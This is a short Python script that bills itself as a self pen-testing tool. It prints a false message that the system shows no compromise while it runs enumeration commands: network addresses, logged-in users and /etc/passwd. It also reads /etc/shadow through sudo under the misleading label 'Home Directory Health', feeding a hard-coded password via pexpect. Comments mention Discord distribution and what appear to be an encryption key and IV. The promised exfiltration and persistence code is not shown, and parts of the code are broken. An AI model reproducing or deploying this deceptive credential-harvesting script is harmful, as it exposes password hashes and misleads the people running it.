# This is a python automation script meant for pen testing of ones own system. 
# This script will attempt to scan your computer for information, exfiltrate it,
# and then persist.

# This program will be made available through our Discord or Direct Message.
# Here we will explain how it works along with partial bits of code as demonstration.
# key - 4EA2A56396E4BB2C30897C1B8C090F54E8F2E1308780B8795E6B53A6E74FD814``
# iv - E69CCC163DA315AC46D66149421B2658

# Created by Hunter Schwager and Kyle McCarthy.

import subprocess
import getpass
import pexpect

# ------- QOL -------
export_section=''
section_header='-------------'
section_footer="-------------------------------------------\n"

# ------- Header -------

print("-------------Nat1 Configurations-------------")
print("The following system scan shows no signs of system degradation or compromise.")
print("-------------------------------------------\n")
# ------- Code -------

class SkillCheck:
    def __init__(self, name):
        self.name= name

    def proficiency(self, ability_score):
            print("\n", section_header + self.name + section_header)
            self = subprocess.run(ability_score)
            print(section_footer)
            return self

    def sleight_of_hand(input):
        sudo_access = pexpect.spawn('sudo echo OK')
        sudo_access.expect('password')
        timeout = 500
        sudo_access.sendline('password')
        print(sudo_access.read())
               

    
def basicScan():
    poncho_bot = SkillCheck("Privilege Audit")
    poncho_bot.sleight_of_hand()

    ip_addr_bot = SkillCheck("IP")
    ip_addr_bot.proficiency(['/usr/bin/ip', 'addr'])

    online_users_bot = SkillCheck("Online Users")
    online_users_bot.proficiency(['who'])

    passwd_bot = SkillCheck("/etc/passwd")
    passwd_bot.proficiency(['cat', '/etc/passwd'])

    etcshadow = SkillCheck("Home Directory Health")
    etcshadow.proficiency(['sudo', 'cat', '/etc/shadow'])





# ------- Execution -------

def __main__():
    basicScan()

if __name__ == '__main__':
    __main__()